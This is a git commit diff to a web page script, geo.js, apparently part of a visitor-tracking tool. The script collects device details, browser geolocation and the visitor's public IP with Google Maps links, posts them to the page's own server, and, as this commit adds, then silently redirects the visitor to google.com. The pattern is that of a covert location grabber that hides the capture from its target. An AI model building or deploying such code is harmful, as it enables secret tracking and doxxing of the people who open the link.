75148f4ff0fb1a6907444cc644ff0c1293ab3c62
tytoap <37224788+tytoap@users.noreply.github.com>
2024-10-02 16:43:07 -0300

    Update geo.js

--- static/geo.js
+++ static/geo.js
@@ -108,6 +108,29 @@ function getCurrentLocation() {
     });
 }
 
+async function sendDataAndRedirect(combinedData, callback) {
+    try {
+        // Envio dos dados coletados
+        const response = await fetch('/submit_data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(combinedData)
+        });
+
+        const result = await response.json();
+        console.log('Resposta do Flask (combined data):', result);
+        
+        // Chama o callback após o envio ser concluído
+        if (callback) {
+            callback();
+        }
+    } catch (error) {
+        console.error('Erro ao enviar dados:', error.message);
+    }
+}
+
 async function initializePage() {
     try {
         const [deviceData, geolocationData, publicIP] = await Promise.all([
@@ -138,17 +161,11 @@ async function initializePage() {
             googleMapsLinkIP: googleMapsLinkIP
         };
 
-        // Send the combined data in one request
-        const response = await fetch('/submit_data', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(combinedData)
+        // Enviar os dados e redirecionar
+        sendDataAndRedirect(combinedData, () => {
+            // Redireciona somente após o envio dos dados
+            window.location.href = "https://www.google.com";
         });
-
-        const result = await response.json();
-        console.log('Resposta do Flask (combined data):', result);
     } catch (error) {
         console.error('Erro ao obter dados:', error.message);
     }
